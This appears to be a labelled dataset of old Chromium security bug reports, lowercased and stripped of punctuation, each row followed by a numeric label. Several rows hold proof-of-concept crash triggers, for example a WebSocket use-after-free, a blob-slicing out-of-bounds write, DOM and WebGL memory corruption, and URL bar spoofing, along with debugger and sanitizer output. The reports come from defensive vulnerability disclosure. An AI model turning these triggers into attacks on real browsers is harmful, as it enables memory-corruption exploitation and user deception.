b\build\slave\chrome-official\build\src\third_party\webkit\webcore\page\domwindow.cpp 1562 001ff09c 652d3b77 chrome_64da0000 webcore domwindow dispatchloadevent d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\page\domwindow.cpp 1516 001ff0c0 652b1e46 chrome_64da0000 webcore document implicitclose d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\dom\document.cpp 2110 001ff0c8 652b1d4b chrome_64da0000 webcore frameloader checkcallimplicitclose d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\loader\frameloader.cpp 904 001ff0e4 652b1c71 chrome_64da0000 webcore frameloader checkcompleted d b\build\slave\chrome-official\build\src\third_party\webkit\webcore\loader\frameloader.cpp 853	9
url bar spoof test chrome 11.0.696.14 dev windows xp sp3	9
url bar spoof test chrome 12.0.712.0 dev windows xp sp3 1 open testcase.htm 2 click clickme	9
url bar spoof test chrome 12.0.712.0 dev windows xp sp3 chromium 12.0.719.0 79793 1 click clickme	9
rip goes to zero with select tag and form validation message with position relative vulnerability details rip 0 or null pointer deref at version chrome version chromium 12.0.710.0 developer build 78857 ubuntu 10.10 webkit 534.26 trunk 81520 operating system ubuntu 10.10 linux 2.6.35-28-generic 49-ubuntu smp tue mar 1 14:39:03 utc 2011 x86_64 reproduction case attached for crashes please include the following additional information type of crash tab crash state 0 in 1 in remove this at third_party/webkit/source/webcore/rendering/renderobject.h:752 2 webcore renderobject destroy this at third_party/webkit/source/webcore/rendering/renderobject.cpp:2187	9
stale entries in gpercentheightdescendantsmap test on stable version 10.0.648.151 stack like this eax=007e77f0 ebx=007e76f8 ecx=007e792c edx=01299600 esi=007e792c edi=007e792c eip=00200815 esp=0013ef94 ebp=0013eff4 iopl=0 nv up ei pl zr na pe nc cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010246 00200815 1:018 k childebp retaddr warning frame ip not in any known module following frames may be wrong 0013ef90 58e6879e 0013efa0 58f170db webcore renderobject containingblock 0013eff4 58f15e47 webcore renderblock layoutblockchildren 0013f078 58f15b2d webcore renderblock layoutblock 0013f088 58f174b5 webcore renderblock layout 0013f0cc 58f172e1 webcore renderblock layoutblockchild 0013f134 58f15e47 webcore renderblock layoutblockchildren 0013f1b8 58f15b2d webcore renderblock layoutblock 0013f1c8 58f174b5 webcore renderblock layout 0013f20c 58f172e1 webcore renderblock layoutblockchild 0013f274 58f15e47 webcore renderblock layoutblockchildren 0013f2f8 58f15b2d webcore renderblock layoutblock 0013f308 58e6ebf0 webcore renderblock layout 0013f370 58e97007 webcore renderview layout 0013f3bc 58e99192 webcore frameview layout 0013f3e0 58a62683 webcore frameview updatelayoutandstyleifneededrecursive 0013f544 58a6260f renderwidget dodeferredupdate 0013f550 58a64056 renderwidget calldodeferredupdate 0013f554 58a61bbe ipc message dispatch renderwidget renderwidget 0013f58c 58a26a0e renderwidget onmessagereceived	9
use after free in websockets possible remote code execution within sandbox immediately calling a close method on websocket object can cause a user-after-free vulnerability traceback from 32 bit ubuntu 10.10 apt-cache show chromium-browser architecture i386 version 10.0.648.133~r77742-0ubuntu0.10.10.1 md5sum d60ffe21bb75d18013d94ae59ff832c7 apt-cache show chromium-browser-dbg version 10.0.648.133~r77742-0ubuntu0.10.10.1 md5sum 7c327515d8040ca547d5df356ebb4914 prerequisites python2 pycurl python-virtualenv cd websockets-dangling make listening on chromium-browser debug single-process gdb bt 0 in webcore websocketchannel didclose this handle at third_party/webkit/source/webcore/websockets/websocketchannel.cpp:180 1 in webcore socketstreamhandleinternal didclose this sockethandle at third_party/webkit/source/webkit/chromium/src/socketstreamhandle.cpp:171 2 in webkit_glue websocketstreamhandleimpl context didclose this web_handle at webkit/glue/websocketstreamhandle_impl.cc:134 3 in ipcwebsocketstreamhandlebridge onclosed this at chrome/common/socket_stream_dispatcher.cc:131 4 in dispatchtomethod socketstreamdispatcher void socketstreamdispatcher int int this msg at base/tuple.h:551 5 dispatch socketstreamdispatcher socketstreamdispatcher void socketstreamdispatcher int this msg at ipc/ipc_message_utils.h:929 6 socketstreamdispatcher onmessagereceived this msg at chrome/common/socket_stream_dispatcher.cc:173 7 in childthread onmessagereceived this msg at chrome/common/child_thread.cc:146 8 in ipc channelproxy context ondispatchmessage this message at ipc/ipc_channel_proxy.cc:255 9 in dispatchtomethod ipc channelproxy context void ipc channelproxy context ipc message const ipc message this at base/tuple.h:551 10 runnablemethod ipc channelproxy context void ipc channelproxy context ipc message const tuple1 ipc message run this at base/task.h:331 11 in messageloop runtask this task at base/message_loop.cc:356 12 in messageloop deferorrunpendingtask this pending_task at base/message_loop.cc:365 13 in messageloop dowork this at base/message_loop.cc:558 14 in base messagepumpdefault run this delegate at base/message_pump_default.cc:23 15 in messageloop runinternal this at base/message_loop.cc:331 16 in runhandler this at base/message_loop.cc:304 17 messageloop run this at base/message_loop.cc:234 18 in base thread run this message_loop at base/threading/thread.cc:128 19 in base thread threadmain this at base/threading/thread.cc:164 20 in base anonymous namespace threadfunc params at base/threading/platform_thread_posix.cc:51 21 in start_thread from lib/libpthread.so.0 22 in clone from lib/libc.so.6 gdb disassemble dump of assembler code for function webcore websocketchannel didclose webcore socketstreamhandle 208 mov edi eax 210 mov esi edx 216 mov edi esp 219 mov edx esp 223 call eax gdb info r eax 779380046 ecx 2 edx 0 ebx 49603364 esp ebp esi 55068640 edi 54178692 eip webcore websocketchannel didclose webcore socketstreamhandle 223 eflags pf if rf gdb x/s edi net.preconnectutilization2_connectbackupjobsenabled gdb p client 1 vptr.websocketchannelclient the traceback is caused by a dereference of a dangling pointer to websocketchannelclient in the websocketchannel instance void websocketchannel didclose socketstreamhandle handle if m_handle websocketchannelclient client m_client m_client 0 m_context 0 m_handle 0 if client client didclose m_unhandledbufferedamount client is already released deref to trigger the bug one need to create a websocket connection and immediately call close before the onconnect event var ws new websocket wsurl ws.close at that point the tcp/ip connection will still be hanging when the websockets server decides to close the connection the didclose method is called to trigger the bug the page needs to be refreshed a few times test case includes a simple websockets http server the cooperation of websockets server is required in oder to close the websockets connection at a proper moment i was able to trigger this bug in some form on chrome/chromium on linux/32bits 64bits windows/32bits mac/64bits though sometimes it required few page refreshes and some modifications to the javascript	11
when object destroyed its select file dialog is not informed to cleared its listener which can call back that destroyed object test chrome 12.0.712.0 dev windows xp sp3	9
url bar spoofing using redirection and location.reload vulnerability details url bar spoofing using redirection and location.reload version chrome version 10.0.648.204 stable beta or dev operating system windows 7 and mac reproduction case click on the button when you see twitter.com on title of tab open a new tab look to the previous tab the url bar show twitter.com with the previous content	9
fails spdy-related check stream is_idle chrome version 11.0.696.0 dev on mac os x 10.6.4 urls if applicable usually various urls under also happens for other urls other browsers tested n/a this is spdy related what steps will reproduce the problem unknown i ve seen this happen several times and in each case i have several different tabs open what is the expected result browser continues running what happens instead browser exits with no user-visible error message etc just exits console app shows the following chrome-related log messages 3/10/11 10:39:33 am com.google.chrome 2867 2867:24579:871731333566 fatal spdy_http_stream.cc 106 check failed stream is_idle 3/10/11 10:44:04 am com.google.chrome 5052 5052:24067:1143038079834 fatal spdy_http_stream.cc 106 check failed stream is_idle 3/10/11 10:48:34 am com.google.chrome 5094 5094:24067:1412791286186 fatal spdy_http_stream.cc 106 check failed stream is_idle	11
getcomputedstyle counterincrement crash webcore countertocssvalue chrome version 11.0.696.16 beta urls if applicable other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 3.x ie 7/8 what steps will reproduce the problem view the attached file a.html in chrome what is the expected result an alert popup with some value what happens instead aw snap	7
stale pointer in svgimage filed upstream at	7
integer overflow in filtereffect copyimagebytes testcase see attached stacktrace memcpy unsigned char dst unsigned char src unsigned long count=4294966728 line 188 asm webcore filtereffect copyimagebytes wtf bytearray source wtf bytearray destination const webcore intrect rect 148 1 6,6 line 152 bytes webcore filtereffect copypremultipliedimage wtf bytearray destination const webcore intrect rect 148 1 6,6 line 217 webcore fegaussianblur apply line 185 webcore rendersvgresourcefilter postapplyresource webcore renderobject object webcore graphicscontext context unsigned short resourcemode=1 const webcore path formal line 298 bytes webcore svgrendersupport finishrendersvgcontent webcore renderobject object webcore paintinfo paintinfo webcore graphicscontext savedcontext line 150 bytes webcore svgrootinlinebox paint webcore paintinfo paintinfo int formal=0 int formal=0 int formal=0 int formal=0 line 70 bytes webcore renderlineboxlist paint webcore renderboxmodelobject renderer webcore paintinfo paintinfo int tx=0 int ty=-14 line 262 bytes webcore renderblock paintcontents webcore paintinfo paintinfo int tx=0 int ty=-14 line 2368 webcore renderblock paintobject webcore paintinfo paintinfo int tx=0 int ty=-14 line 2482 webcore renderblock paint webcore paintinfo paintinfo int tx=0 int ty=-14 line 2257 bytes webcore rendersvgtext paint webcore paintinfo paintinfo int formal=0 int formal=0 line 241 webcore renderbox paint webcore paintinfo paintinfo int tx=0 int ty=0 line 783 bytes webcore rendersvgroot paint webcore paintinfo paintinfo int parentx=8 int parenty=169 line 186 webcore inlinebox paint webcore paintinfo paintinfo int tx=8 int ty=169 int formal=0 int formal=0 line 184 bytes webcore inlineflowbox paint webcore paintinfo paintinfo int tx=8 int ty=169 int linetop=0 int linebottom=504 line 1000 bytes webcore rootinlinebox paint webcore paintinfo paintinfo int tx=8 int ty=169 int linetop=0 int linebottom=504 line 184 webcore renderlineboxlist paint webcore renderboxmodelobject renderer webcore paintinfo paintinfo int tx=8 int ty=169 line 262 bytes webcore renderblock paintcontents webcore paintinfo paintinfo int tx=8 int ty=169 line 2368 webcore renderblock paintobject webcore paintinfo paintinfo int tx=8 int ty=169 line 2482 webcore renderblock paint webcore paintinfo paintinfo int tx=8 int ty=169 line 2257 bytes webcore renderblock paintchildren webcore paintinfo paintinfo int tx=8 int ty=16 line 2410 bytes webcore renderblock paintcontents webcore paintinfo paintinfo int tx=8 int ty=16 line 2370 webcore renderblock paintobject webcore paintinfo paintinfo int tx=8 int ty=16 line 2482 webcore renderblock paint webcore paintinfo paintinfo int tx=8 int ty=16 line 2257 bytes webcore renderblock paintchildren webcore paintinfo paintinfo int tx=0 int ty=0 line 2410 bytes webcore renderblock paintcontents webcore paintinfo paintinfo int tx=0 int ty=0 line 2370 webcore renderblock paintobject webcore paintinfo paintinfo int tx=0 int ty=0 line 2482 webcore renderblock paint webcore paintinfo paintinfo int tx=0 int ty=0 line 2257 bytes webcore renderlayer paintlayer webcore renderlayer rootlayer webcore graphicscontext p const webcore intrect paintdirtyrect 0,0 1249,679 unsigned int paintbehavior=0 webcore renderobject paintingroot wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect overlaptestrequests unsigned int paintflags=0 line 2555 bytes webcore renderlayer paintlist wtf vector webcore renderlayer 0 list 1 m_renderer m_parent m_previous webcore renderlayer rootlayer webcore graphicscontext p const webcore intrect paintdirtyrect 0,0 1249,679 unsigned int paintbehavior=0 webcore renderobject paintingroot wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect overlaptestrequests unsigned int paintflags=0 line 2615 webcore renderlayer paintlayer webcore renderlayer rootlayer webcore graphicscontext p const webcore intrect paintdirtyrect 0,0 1249,679 unsigned int paintbehavior=0 webcore renderobject paintingroot wtf hashmap webcore overlaptestrequestclient webcore intrect wtf ptrhash webcore overlaptestrequestclient wtf hashtraits webcore overlaptestrequestclient wtf hashtraits webcore intrect overlaptestrequests unsigned int paintflags=0 line 2578 webcore renderlayer paint webcore graphicscontext p const webcore intrect damagerect 0,0 1249,679 unsigned int paintbehavior=0 webcore renderobject paintingroot line 2350 webcore frameview paintcontents webcore graphicscontext p const webcore intrect rect 0,0 1249,679 line 2305 webcore scrollview paint webcore graphicscontext context const webcore intrect rect 0,0 1249,679 line 941 bytes webkit webframeimpl paintwithcontext webcore graphicscontext gc const webkit webrect rect line 1941 bytes webkit webframeimpl paint skia platformcanvas canvas const webkit webrect rect line 1952 bytes webkit webviewimpl paint skia platformcanvas canvas const webkit webrect rect line 1091 renderwidget paintrect const gfx rect rect x=0 y=0 w=1249 h=679 const gfx point canvas_origin=x=0 y=0 skia platformcanvas canvas line 453 bytes renderwidget dodeferredupdate line 635 bytes renderwidget calldodeferredupdate line 546	7
integer underflow in htmlformelement m_associatedelementsafterindex credit cris s happytime fuzzer testcase1 a var form button form wyglh progress keygen form wwdku a datalist button testcase2 form em ol del fieldset form mfbrm sub option dt button form ezqyw em meter time stack assertion failed position size wtf vector webcore formassociatedelement 0 insert webcore formassociatedelement webcore htmlformelement registerformelement webcore htmlformcontrolelement htmlformcontrolelement webcore htmlbuttonelement htmlbuttonelement webcore htmlbuttonelement create webcore buttonconstructor kent do you have time to take a look at this	7
freed m_viewportrenderer in frameview updateoverflowstatus stacktrace webcore treeshared webcore containernode ref line 62 bytes wtf refifnotnull webcore node webcore node ptr line 54 wtf passrefptr webcore node passrefptr webcore node webcore node ptr line 67 bytes webcore frameview updateoverflowstatus bool horizontaloverflow=false bool verticaloverflow=false line 1981 bytes webcore frameview layout bool allowsubtree=true line 960 webcore frameview visiblecontentsresized line 1492 webcore scrollview updatescrollbars const webcore intsize desiredoffset 0,0 line 516 bytes webcore scrollview setcontentssize const webcore intsize newsize 912,1051 line 299 webcore frameview setcontentssize const webcore intsize size 912,1051 line 446 webcore frameview adjustviewsize line 471 bytes webcore frameview layout bool allowsubtree=true line 927 webcore frameview updatelayoutandstyleifneededrecursive line 2385 webkit webframeimpl layout line 1927 webkit webviewimpl layout line 1030 renderwidget dodeferredupdate line 568 bytes renderwidget calldodeferredupdate line 546 will post the repro shortly	7
bad cast due to childreninline assumption in rendersvgtext testcase html xmlns test passes if it does not crash script if window.layouttestcontroller layouttestcontroller.dumpastext script style svg text before display list-item content pass style svg xmlns text text svg html stacktrace 0 in webcore inlineflowbox addtoline webcore inlinebox 1 in webcore renderblock createlineboxes webcore renderobject bool webcore inlinebox 2 in webcore renderblock constructline unsigned int webcore bidirun webcore bidirun bool bool webcore renderobject webcore renderobject 3 in webcore renderblock layoutinlinechildren bool int int 4 in webcore rendersvgtext layout 5 in webcore svgrendersupport layoutchildren webcore renderobject bool 6 in webcore rendersvgroot layout 7 in webcore renderblock layoutinlinechildren bool int int 8 in webcore renderblock layoutblock bool int 9 in webcore renderblock layout 10 in webcore renderblock layoutblockchild webcore renderbox webcore renderblock margininfo int int 11 in webcore renderblock layoutblockchildren bool int 12 in webcore renderblock layoutblock bool int 13 in webcore renderblock layout 14 in webcore renderblock layoutblockchild webcore renderbox webcore renderblock margininfo int int	7
webkit 49902 chrome.dll webcore towebwidgetclient readav null 08ffd4f21a8c6465bb1e19a2f52e4bd5 repro img src data image/svg+xml doctypeg public quot quot quot 1 quot g xmlns quot style id chrome.dll webcore towebwidgetclient readav null 08ffd4f21a8c6465bb1e19a2f52e4bd5 description attempt to read from unallocated null pointer in chrome.dll webcore towebwidgetclient application chromium 9.0.586.0 stack chrome.dll webcore towebwidgetclient chrome.dll webcore chromiumbridge screenrect chrome.dll webcore screenrect chrome.dll webcore device_aspect_ratiomediafeatureeval chrome.dll webcore mediaqueryevaluator eval chrome.dll webcore mediaqueryevaluator eval chrome.dll webcore cssruleset addrulesfromsheet chrome.dll webcore cssstyleselector cssstyleselector chrome.dll webcore document createstyleselector chrome.dll webcore element recalcstyle chrome.dll webcore document recalcstyle chrome.dll webcore document styleselectorchanged chrome.dll webcore document removependingsheet chrome.dll webcore styleelement sheetloaded chrome.dll webcore htmlstyleelement sheetloaded chrome.dll webcore cssstylesheet checkloaded chrome.dll webcore styleelement createsheet chrome.dll webcore styleelement process chrome.dll webcore styleelement finishparsingchildren chrome.dll webcore svgstyleelement finishparsingchildren chrome.dll webcore xmldocumentparser endelementns chrome.dll xmlparseendtag2 chrome.dll xmlparsetryorfinish	9
multiple integer overflows in svg filter effects upstream bug is when fixing the bug in i found a number of integer overflows in the surrounding code but was n't sure if there was a way to trigger them i now have a repro for these where i can force arbitrarily sized allocations and overflow the allocated buffer the attached repro will trigger an overflow in filtereffect createunmultipliedimageresult by tweaking the values in the matrix you can arbitrarily control height and width causing the following multiplication to wrap and allocate a smaller than expected buffer bytearray create m_absolutepaintrect.width m_absolutepaintrect.height 4 similar overflows exist in filtereffect createpremultipliedimageresult filtereffect copypremultipliedimage filtereffect copyunmultipliedimage and filtereffect copyimagebytes i am auditing the code to see if i can find others as well	7
bypass popup blocker using custom event and onmouseover it is possible to bypass popup blocker using a custom javascript event this is a slight variation of issue 3275 reported by skylined chromium.org and issue 71167 reported by myself but this issue needs the use of onmouseover or onmousemove event version chrome version 9.0.597.84 stable 11.0.662.0 73964 dev operating system ubuntu 10.04 reproduction case 1 open event_mm.html file 2 move the mouse over blue square 3 it will open a popup it is also possible to use onmousemove event instead of onmouseover for the div with id r in event_mm.html	2
stale pointer in webcore renderblock marginbeforeforchild vulnerability details under certain circumstances chromium will crash in webcore renderblock marginbeforeforchild it seems that the variable child is a stale pointer in general this seems to be a problem related to floats and display list-item version chrome version chromium 11.0.696.65 ubuntu 10.10 stable google chrome 13.0.761.0 dev dev operating system ubuntu 10.10 32-bit reproduction case doctype html html head title marginbeforechild crash title head body onload boom span style display webkit-inline-box span id span1 span blockquote blockquote span span p style float left border-style inset p span span span id span2 style display list-item span span script type text/javascript function boom span1 document.getelementbyid span1 span2 document.getelementbyid span2 tfoot document.createelement tfoot span2.appendchild tfoot document.body.offsettop span1.parentnode.removechild span1 script body html for crashes please include the following additional information type of crash tab gdb r starting program usr/lib/chromium-browser/chromium-browser single-process crash.html program received signal sigsegv segmentation fault switching to thread lwp 2668 in gdb bt 0 in 1 in webcore renderblock marginbeforeforchild this child at third_party/webkit/source/webcore/rendering/renderblock.cpp:6052 2 in ypositionforfloatincludingmargin this at third_party/webkit/source/webcore/rendering/renderblock.h:477 3 webcore renderblock addoverflowfromfloats this at third_party/webkit/source/webcore/rendering/renderblock.cpp:1388 4 in webcore renderblock computeoverflow this oldclientafteredge=38 recomputefloats=false at third_party/webkit/source/webcore/rendering/renderblock.cpp:1348 5 in webcore renderblock layoutblock this relayoutchildren=false pagelogicalheight=0 at third_party/webkit/source/webcore/rendering/renderblock.cpp:1258 6 in webcore renderblock layout this at third_party/webkit/source/webcore/rendering/renderblock.cpp:1120 7 in webcore renderlistitem layout this at third_party/webkit/source/webcore/rendering/renderlistitem.cpp:243 gdb disas dump of assembler code for function webcore renderblock marginbeforeforchild webcore renderboxmodelobject const 0 push ebp 1 mov esp ebp 3 sub esp 6 mov ebp eax 9 mov ebp edx 12 mov eax eax 15 movzbl eax eax 19 shr al 22 and eax 25 cmp eax 28 je webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+88 30 cmp eax 33 je webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+72 35 cmp eax 38 je webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+56 40 mov edx eax 42 mov edx esp 45 call eax type return to continue or q return to quit 51 leave 52 ret 53 lea esi esi 56 mov edx eax 58 mov edx esp 61 call eax 67 leave 68 ret 69 lea esi esi 72 mov edx eax 74 mov edx esp 77 call eax 83 leave 84 ret 85 lea esi esi 88 mov edx eax 90 mov edx esp 93 call eax 99 leave 100 ret end of assembler dump gdb i r eax 50763344 ecx 55518208 edx 50763784 ebx 49557252 esp ebp esi 56038088 edi 56003616 eip webcore renderblock marginbeforeforchild webcore renderboxmodelobject const+51 eflags cf pf af sf if rf id cs 115 ss 123 ds 123 es 123 fs 0 gs 51	7
memory corruption in gpu command buffer credit cris testcase.html meta http-equiv refresh content 3 div audio src javascript try gc catch ex onerror try document.body.normalize true catch ex try var r document.createrange catch ex try getselection addrange r catch ex div video id='targetvideo src canvas id='glcanvas'no webgl for you canvas script try var canvas document.getelementbyid glcanvas catch ex try var gl canvas.getcontext experimental-webgl catch ex try var csupb gl.createbuffer catch ex script stacktrace program received signal exc_bad_access could not access memory reason kern_invalid_address at address switching to process 84457 in gpu commandbufferhelper waitforavailableentries this count=3 at users/aarya/chromium/src/gpu/command_buffer/client/cmd_buffer_helper.cc:52 52 commandbuffer state state command_buffer flushsync put get current language auto currently c 0 in gpu commandbufferhelper waitforavailableentries this count=3 at users/aarya/chromium/src/gpu/command_buffer/client/cmd_buffer_helper.cc:52 1 in gpu commandbufferhelper getspace this entries=3 at users/aarya/chromium/src/gpu/command_buffer/client/cmd_buffer_helper.cc:166 2 in getcmdspace gpu cmd setbucketsize inlined at users/aarya/chromium/src/gpu/command_buffer/client/cmd_buffer_helper.h:1687 3 in gpu commandbufferhelper setbucketsize at users/aarya/chromium/src/gpu/command_buffer/client/cmd_buffer_helper.h:166 4 in gpu gles2 gles2implementation getrequestableextensionschromium this at users/aarya/chromium/src/gpu/command_buffer/client/gles2_implementation.cc:1687 5 in gles2getrequestableextensionschromium at gles2_c_lib_autogen.h:872 6 in webgraphicscontext3dcommandbufferimpl getrequestableextensionschromium this at users/aarya/chromium/src/content/renderer/webgraphicscontext3d_command_buffer_impl.cc:389 7 in renderview supportsasynchronousswapbuffers this at users/aarya/chromium/src/content/renderer/render_view.cc:3916 8 in renderwidget didactivateacceleratedcompositing this active=true at users/aarya/chromium/src/content/renderer/render_widget.cc:864 9 in wtf ownptr webcore page get at users/aarya/chromium/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:2458 10 in webkit webviewimpl page at users/aarya/chromium/src/third_party/webkit/source/javascriptcore/wtf/ownptr.h:243 11 in webkit webviewimpl setisacceleratedcompositingactive this active=true at users/aarya/chromium/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:2479 12 in wtf refptr webcore layerrendererchromium operator webcore layerrendererchromium wtf refptr webcore layerrendererchromium at users/aarya/chromium/src/third_party/webkit/source/javascriptcore/wtf/refptr.h:2375 13 in webkit webviewimpl setrootgraphicslayer this layer at users/aarya/chromium/src/third_party/webkit/source/webkit/chromium/src/webviewimpl.cpp:2376 14 in webcore renderlayercompositor ensurerootplatformlayer this at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp rendering/renderlayercompositor.cpp:1659 15 in webcore renderlayercompositor enablecompositingmode at users/aarya/chromium/src/third_party/webkit/source/webcore/rendering/renderlayercompositor.cpp:134 16 in webcore renderlayercompositor updatebacking this layer shouldrepaint=webcore renderlayercompositor compositingchangerepaintnow at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp rendering/renderlayercompositor.cpp:329 17 in webcore renderlayercompositor updatelayercompositingstate this layer shouldrepaint=webcore renderlayercompositor compositingchangerepaintnow at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp rendering/renderlayercompositor.cpp:399 18 in webcore renderlayer contentchanged this changetype=webcore renderlayer videochanged at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp rendering/renderlayer.cpp:230 19 in webcore rendervideo updateplayer this at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp rendering/rendervideo.cpp:243 20 in webcore htmlmediaelement endprocessingmediaplayercallback at users/aarya/chromium/src/third_party/webkit/source/webcore/html/htmlmediaelement.h:2032 21 in webcore htmlmediaelement mediaplayerengineupdated this at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp html/htmlmediaelement.cpp:2033 22 in wtf ownptr webcore mediaplayerprivateinterface operator at users/aarya/chromium/src/third_party/webkit/source/javascriptcore/wtf/ownptr.h:366 23 in webcore mediaplayer loadwithnextmediaengine this current at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp platform/graphics/mediaplayer.cpp:370 24 in derefifnotnull wtf stringimpl inlined at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp platform/graphics/mediaplayer.cpp:345 25 refptr inlined at wtfstring.h:58 26 string inlined at users/aarya/chromium/src/third_party/webkit/source/javascriptcore/wtf/text/wtfstring.h:115 27 in webcore mediaplayer load this url contenttype at wtfstring.h:345 28 in webcore htmlmediaelement loadresource this initialurl contenttype at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp html/htmlmediaelement.cpp:721 29 in refptr inlined at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp html/htmlmediaelement.cpp:651 30 in string inlined at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp html/htmlmediaelement.cpp:115 31 in contenttype inlined at users/aarya/chromium/src/third_party/webkit/source/webcore/platform/contenttype.h:34 32 in webcore htmlmediaelement selectmediaresource this at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp html/htmlmediaelement.cpp:651 33 in webcore timer webcore htmlmediaelement fired this at timer.h:100 34 in webcore threadtimers sharedtimerfiredinternal this at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp platform/threadtimers.cpp:112 35 in webcore threadtimers sharedtimerfired at users/aarya/chromium/src/third_party/webkit/source/webcore/webcore.gyp platform/threadtimers.cpp:90 36 in anonymous namespace taskclosureadapter run this at users/aarya/chromium/src/base/message_loop.cc:101 37 in iterator inlined at users/aarya/chromium/src/base/observer_list.h:473 38 in messageloop runtask this pending_task at users/aarya/chromium/src/base/message_loop.cc:474	11
oob write in bloburlrequestjob headerscompleted found in my fuzzing kostya reduced testcase put it in chrome/src/third_party/webkit/layouttests/fast/files script var testindex 0 var sliceparams 9223372036854775000 function testslicing start end var reader new filereader if end undefined subblob blob.webkitslice start reader.readastext subblob function runnexttest var start sliceparams testindex 0 var end sliceparams testindex 1 testslicing start end var builder new webkitblobbuilder blob builder.getblob runnexttest script meta http-equiv refresh content 2 line stacktrace 1651 error addresssanitizer crashed on address at pc write of size 1 at shadow mem thread 0 in webkit_blob bloburlrequestjob headerscompleted int std basic_string char std char_traits char std allocator char const 0 1 in webkit_blob bloburlrequestjob notifysuccess 0 2 in webkit_blob bloburlrequestjob countsize 0 3 in anonymous namespace taskclosureadapter run base/message_loop.cc:0 4 in messageloop runtask messageloop pendingtask const 0 5 in messageloop deferorrunpendingtask messageloop pendingtask const 0 6 in messageloop dowork 0 7 in base messagepumplibevent run base messagepump delegate 0 8 in messageloop runinternal 0 9 in messageloop run 0 10 in base thread threadmain 0 11 in base anonymous namespace threadfunc void base/threading/platform_thread_posix.cc:0 12 13 is the address located 361 bytes inside of region freed by thread here 0 in operator delete void asan_rtl 1 in net urlrequestjob notifyheaderscomplete 0 2 in webkit_blob bloburlrequestjob headerscompleted int std basic_string char std char_traits char std allocator char const 0 3 in webkit_blob bloburlrequestjob notifysuccess 0 4 in webkit_blob bloburlrequestjob countsize 0 5 in anonymous namespace taskclosureadapter run base/message_loop.cc:0 6 in messageloop runtask messageloop pendingtask const 0 7 in messageloop deferorrunpendingtask messageloop pendingtask const 0 8 in messageloop dowork 0 9 in base messagepumplibevent run base messagepump delegate 0 previously allocated by thread here 0 in operator new unsigned long asan_rtl 1 in anonymous namespace blobprotocolhandler maybecreatejob net urlrequest const chrome/browser/net/blob_url_request_job_factory.cc:0 2 in net urlrequestjobmanager createjob net urlrequest const 0 3 in net urlrequest start 0 4 in resourcequeue addrequest net urlrequest resourcedispatcherhostrequestinfo const 0 5 in resourcedispatcherhost beginrequestinternal net urlrequest 0 6 in resourcedispatcherhost beginrequest int resourcehostmsg_request const ipc message int 0 7 in resourcedispatcherhost onmessagereceived ipc message const resourcemessagefilter bool 0 8 in resourcemessagefilter onmessagereceived ipc message const bool 0 9 in browsermessagefilter dispatchmessage ipc message const 0 stats 67m malloced 27m for red zones by 178036 calls stats 1m realloced by 12014 calls stats 50m freed by 124986 calls stats 0m really freed by 0 calls stats 42m of shadow memory allocated in 42 clusters 1m each 10 low and 32 high 1651 aborting shadow byte and word 39 d0 d0 d0 d0 d0 d0 d0 39 more shadow bytes d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 d0 39 59 fd 0b 00 00 00 00 db db db db db db db db db db 00 da da da da da da da da da da d0 d0 db db	11
chrome.dll browseraccessibility internalreleasereference execav null cc7203fb809bd98728cf74b908e66edf just noticed my fuzzer found that internalreleasereference has exploitable memory corruption in browser nor renderer it s 9pm so i do n't have time to investigate right away run chrome with enable-accessibility force-renderer-accessibility run repro script function go htmldocument_0=document htmldocument_0.write settimeout function htmldocument_0.close settimeout function htmldocument_0.writeln i settimeout function htmldocument_0.write q section section q q/by settimeout function htmldocument_0.write li settimeout function htmldocument_0.close location.reload 100 100 100 100 100 script body onload go body dmazzoni you seem to have introduced this in 77316 can you have a look sec severity medium browser memory corruption but behind a flag and only introduced 24 hrs ago afaik	11
css visited history disclosure john lambert from ms just gave this to me it looks like a variant of the css visited history leak it s from an ms internal test suite they use on ie i just tested the poc and it works on stable i have n't tested against webkit trunk but i assume it would be affected as well	2
security instant hard-crash with js code chrome version 10,12 win7 64bit urls if applicable look at the attachment other browsers tested add ok or fail after other browsers where you have tested this issue safari 5 firefox 3.x ok ie 7/8 what steps will reproduce the problem 1.run the html page in the attachment 2.click anywhere on the page what is the expected result chrome should n't crash what happens instead it does please provide any additional information below attach a screenshot if possible this is the js code that will cause the crash function post_submit var i for i 0 i form_cnt i var s new string form i document.forms s submit function pre_submit var i for i 0 i form_cnt i 2 that was intented var s new string form i document.write form id s action omg.html document.write something input type='text name='query document.write a href javascript submit send a function do_job pre_submit post_submit	9
bypass extension manifest permission test chrome 11.0.696.16 dev windows xp sp3 from issue 76666	2
